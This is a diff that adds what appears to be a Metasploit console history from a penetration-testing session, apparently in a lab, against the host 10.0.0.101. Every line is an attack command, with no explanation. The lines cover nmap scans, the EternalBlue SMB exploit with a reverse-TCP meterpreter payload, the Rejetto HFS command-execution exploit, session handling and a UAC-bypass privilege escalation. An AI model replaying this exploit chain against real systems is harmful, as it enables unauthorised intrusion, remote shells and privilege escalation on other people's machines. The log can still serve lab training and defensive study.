@@ -1,0 +1,68 @@
+hosts
+exit
+hosts
+exit
+db_nmap -sV -O -T5 -Pn 10.0.0.101
+db_nmap -sV -O -T5 -Pn 10.0.0.101 -oX ~/nmap_out.xml
+db_nmap -sV -O -T5 -Pn 10.0.0.101 -oX /root/nmap_out.xml
+search eternal
+use exploit/windows/smb/ms17_010_eternalblue
+options
+set RHOST 10.0.0.101
+run
+show payloads
+use windows/x64/shell/reverse_tcp
+search eternal
+use exploit/windows/smb/ms17_010_eternalblue
+show payloads
+set payload windows/x64/meterpreter/reverse_tcp
+options
+run
+workspace
+workspace -a Bob
+workspace Bob 
+workspace 
+db_nmap -sS -T4 10.0.0.101
+db_nmap -sV -T4 10.0.0.101
+show services
+show service
+services
+workspace Bob 
+search rejetto
+info rejetto
+use exploit/windows/http/rejetto_hfs_exec 
+info
+hosts
+set RhOST 10.0.0.101
+show infor
+show info
+run
+sessions
+sessions
+sessions
+sessions 1
+search psexec
+search psexec platform:windows
+sessions 1
+use exploit/windows/local/bypassuac
+use exploit/windows/local/bypassuac_fodhelper 
+options
+set SESSION 1
+options
+run
+sessions
+options
+set target Windows x64
+options
+run
+sessions 1
+db_nmap -sS -T4 10.0.0.101
+db_nmap -sV -T4 10.0.0.101
+exit
+workspace Bob 
+hosts
+search rejetto
+use exploit/windows/http/rejetto_hfs_exec 
+show info
+hosts
+set RhOST 10.0.0.101
